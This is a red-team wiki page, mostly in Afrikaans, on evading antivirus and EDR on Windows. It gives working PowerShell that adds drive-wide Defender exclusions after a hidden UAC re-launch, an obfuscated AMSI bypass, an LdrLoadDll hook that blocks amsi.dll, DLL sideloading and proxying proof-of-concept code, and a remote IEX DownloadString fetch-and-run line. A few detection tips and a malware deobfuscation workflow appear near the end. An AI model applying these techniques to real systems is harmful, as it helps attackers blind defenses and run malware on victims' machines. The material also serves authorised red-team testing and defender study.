# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender se werking te staak.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender se werking te staak deur 'n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-agtige UAC-lokaas voordat aan Defender geknoei word

Publieke loaders wat maskeer as game cheats verskyn dikwels as ongetekende Node.js/Nexe installateurs wat eers die gebruiker **om verhoogde regte vra** en eers daarna Defender neutraal maak. Die proses is eenvoudig:

1. Kyk vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin-regte het, dus dui 'n mislukking aan dat die loader as 'n standaard gebruiker loop.
2. Herbegin onmiddellik homself met die `RunAs` verb om die verwagte UAC-toestemmingsprompt te aktiveer terwyl die oorspronklike opdragreël behou word.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, dus word die prompt gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte verkry het, maksimeer GachiLoader-style chains Defender se blindekolle in plaas daarvan om die diens heeltemal af te skakel. Die loader beëindig eers die GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) en stoot dan **uiters breë uitsluitings** sodat elke gebruikersprofiel, stelselmap en verwyderbare skyf nie meer geskandeer kan word nie:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïewe gesondheidskontroles hou aan om “antivirus active” te rapporteer selfs al raak real-time inspeksie daardie paaie nooit aan nie.

## **AV Ontduikingsmetodologie**

Tans gebruik AV's verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: statiese detectie, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.

### **Static detection**

Statiese detectie word bereik deur bekende kwaadwillige stringe of byteskes in 'n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan laat vang, aangesien hulle waarskynlik al ontleed en as kwaadwillig gemerk is. Daar is 'n paar maniere om hierdie soort detectie te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV geen manier hê om jou program te herken nie, maar jy sal 'n soort loader nodig hê om die program in geheue te dekodeer en uit te voer.

- **Obfuscation**

Soms hoef jy net 'n paar stringe in jou binary of script te verander om dit deur AV te kry, maar dit kan tydrowend wees afhangende van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dynamic analysis**

Dinamiese analise is wanneer die AV jou binary in 'n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou browser se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS te doen, ens.). Hierdie deel kan bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandbokse te omseil.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dinamiese analise te omseil. AV's het baie kort tyd om lêers te scan om nie die gebruiker se werkvloei te onderbreek nie, so lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandbokse net die sleep kan oorslaan afhangend van die implementasie.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die fan-snelhede te kontroleer — nie alles word in die sandbox geïmplementeer nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein ingesluit is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit met die een wat jy gespesifiseer het ooreenstem; as dit nie ooreenstem nie, kan jy jou program laat uitstap.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, so jy kan vir die rekenaam in jou malware kyk voor detonering — as die naam HAL9TH is, beteken dit jy is binne Defender se sandbox en jy kan jou program laat uitstap.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir werk teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër gesê het, sal **openbare tools** uiteindelik **gedetecteer word**, so jy moet jouself afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik laasgenoemde. Mimikatz is waarskynlik een van, indien nie die mees gemerkte stuk malware deur AVs en EDRs nie — al is die projek baie cool, is dit 'n nagmerrie om daarmee te werk om AVs te omseil, so soek net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Wanneer moontlik, prioritiseer altyd die gebruik van DLLs vir ontduiking — volgens my ervaring word DLL-lêers gewoonlik baie minder gedetecteer en geanaliseer, so dit is 'n baie eenvoudige truuk om in sekere gevalle deteksie te vermy (as jou payload natuurlik 'n manier het om as 'n DLL te loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n detectie-tempo van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 detectie-tempo het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou wys ons 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer skelm te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL search order wat deur die loader gebruik word deur beide die slagoffer-program en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan na programme kyk wat vatbaar is vir DLL Sideloading gebruik makend van [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **self DLL Hijackable/Sideloadable programmes ondersoek**, hierdie tegniek is redelik stealthy as dit behoorlik gedoen word, maar as jy publiek-bekende DLL Sideloadable programmes gebruik, kan jy maklik gevang word.

Net om 'n malicious DLL met die naam wat 'n program verwag om te laai te plaas, sal nie jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag; om hierdie probleem reg te stel, gaan ons 'n ander tegniek gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL deur, sodoende die program se funksionaliteit te behou en in staat te wees om die uitvoering van jou payload te hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 detectietempo op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **raai sterk aan** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer in-diepte te leer oor wat ons bespreek het.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export-inskrywing 'n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows loader:

- Laai `TargetDll` as dit nog nie gelaai is nie
- Los `TargetFunc` daaruit op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit vanaf die beskermde KnownDLLs-namespace voorsien (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module wat die forward-oplossing uitvoer insluit.

Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n ondertekende DLL wat 'n funksie exporteer wat vooruitgestuur is na 'n nie-KnownDLL-modulenaam, en plaas daardie ondertekende DLL saam in dieselfde gids as 'n deur die aanvaller beheerde DLL met presies dieselfde naam as die forwarded doelmodule. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, wat jou DllMain uitvoer.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (kopieer-plak):
1) Kopieer die gesigneerde stelsel DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die deurstuur met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout nadat `DllMain` reeds uitgevoer het

Opsporingswenke:
- Fokus op forwarded exports waar die target module nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Kyk na die Windows 11 forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdedi­gingsidees:
- Moniteer LOLBins (bv. rundll32.exe) wat gesigneerde DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van non-KnownDLLs met dieselfde basisnaam uit daardie gids
- Waarsku by proses/module-kettinge soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paaie
- Dwing code-integriteitsbeleide (WDAC/AppLocker) af en weier skryf+uitvoering in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat-en-muisspel; wat vandag werk, kan môre opgespoor word, moenie net op een gereedskap staatmaak nie — indien moontlik, probeer om verskeie ontduikingsmetodes aan mekaar te koppel.

## Direct/Indirect Syscalls & SSN-resolusie (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` syscall stubs. Om daardie hooks te omseil, kan jy **direct** of **indirect** syscall stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel-modus oorskakel sonder om die ge-hookte export entrypoint uit te voer.

**Invocation options:**
- **Direct (embedded)**: voeg 'n `syscall`/`sysenter`/`SVC #0` instruksie in die gegenereerde stub in (geen `ntdll` export hit).
- **Indirect**: spring in 'n bestaande `syscall` gadget binne `ntdll` sodat die kernel-oorskakeling lyk asof dit vanaf `ntdll` afkomstig is (nuttig vir heuristiese ontduiking); **randomized indirect** kies 'n gadget uit 'n swembad per oproep.
- **Egg-hunt**: vermy om die statiese `0F 05` opcode-reeks op skyf te embed; los 'n syscall-reeks tydens runtime op.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: lei SSN's af deur syscall stubs volgens virtuele adres te sorteer in plaas daarvan om stub-bytes te lees.
- **SyscallsFromDisk**: map 'n skoon `\KnownDlls\ntdll.dll`, lees SSN's uit sy `.text`, en unmap dan (omseil alle in-memory hooks).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validasie wanneer 'n stub skoon is; val terug op VA-afleiding as dit ge-hook is.
- **HW Breakpoint**: stel DR0 op die `syscall` instruksie en gebruik 'n VEH om die SSN uit `EAX` by runtime te vang, sonder om ge-hookte bytes te ontleed.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op die skyf** skandeer, so as jy op een of ander manier payloads **direk in geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende Windows-komponente.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirusoplossings toe om scriptgedrag te ondersoek deur scriptinhoud bloot te stel in 'n vorm wat nie versleuteld of obfuskeer is nie.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop dat dit `amsi:` vooraan sit en dan die pad na die uitvoerbare lêer vanwaar die script uitgevoer is, in hierdie geval, powershell.exe

Ons het geen lêer na die skyf neergelê nie, maar is steeds in geheue gevang weens AMSI.

Verder, vanaf **.NET 4.8**, word C# kode ook deur AMSI gehardloop. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory uitvoering te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory uitvoering as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met static detections werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om deteksie te ontduik.

AMSI het egter die vermoë om scripts te unobfuscate selfs al het dit meerdere lae, dus kan obfuscation 'n slegte opsie wees afhangende van hoe dit gedoen word. Dit maak dit nie so reguit om te ontduik nie. Soms hoef jy egter net 'n paar veranderlike name te verander en dan is jy reg, so dit hang af van hoe erg iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs wanneer jy as 'n onbevoorregte gebruiker werk. Vanweë hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

Om die AMSI-initialisering te forceer om te misluk (amsiInitFailed) sal daartoe lei dat geen skandering vir die huidige proses geïnisieer sal word nie. Dit is oorspronklik bekend gemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Al wat daarvoor nodig was, was een reël powershell-kode om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, so 'n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik opgemerk sal word wanneer hierdie pos uitkom, dus moet jy nie enige code publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en behels die vind van die adres van die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van gebruikersgegewe insette) en dit oorskryf met instruksies om die code vir E_INVALIDARG terug te gee; op hierdie manier sal die resultaat van die werklike skandering 0 teruggee, wat geïnterpreteer word as 'n skoon resultaat.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetaileerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil — kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal‑onafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die versoekte module `amsi.dll` is. Gevolglik laai AMSI nooit en vind daar geen skanderings vir daardie proses plaas nie.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en pasgemaakte loaders (enige iets wat andersins AMSI sou laai).
- Kombineer dit deur scripts oor stdin te voed (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Waargeneem in gebruik deur loaders wat deur LOLBins uitgevoer word (bv., `regsvr32` wat `DllRegisterServer` aanroep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook script om AMSI te omseil.
Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook script om AMSI te omseil deur handtekeninge te vermy met gerandomiseerde gebruiker-gedefinieerde funksies, veranderlikes, karakteruitdrukkings en deur ewekansige karakterkas op PowerShell-sleutelwoorde toe te pas om handtekeninge te vermy.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n tool soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie tool werk deur die geheue van die huidige proses te deursoek vir die AMSI-handtekening en dit dan oor te skryf met NOP-instruksies, en verwyder dit effektief uit die geheue.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, dus kan jy jou scripts uitvoer sonder dat AMSI dit deursoek. Jy kan dit doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en ontsleutel dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige wysiging die binary kan laat crash. Gebruik **AntiTamperKiller** om die encrypted metadata tables te lokaliseer, herstel die XOR keys en herskryf 'n skoon assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* file in by **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profile  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en variable names herstel en constant strings ontsleutel.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met lightweight wrappers (a.k.a *proxy calls*) om dekompilasie verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van onsigbare wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resulterende binary in dnSpy uit, soek na groot Base64 blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *egte* payload te lokaliseer. Meestal stoor die malware dit as 'n TLV-encoded byte array geïnitialiseer binne `<Module>.byte_0`.

Die bogenoemde ketting herstel die uitvoeringstroom **sonder** om die kwaadwillige sample te moet uitvoer – nuttig wanneer jy op 'n offline workstation werk.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) samestellingssuite te verskaf wat verbeterde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens samestelling, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat deur die C++ template metaprogramming framework gegenereer word, wat die lewe van iemand wat die toepassing wil kraak 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op assembler-kodevlak deur gewone instruksies in ROP-kettings te transformeer, wat ons natuurlike begrip van normale control flow dwarsboom.
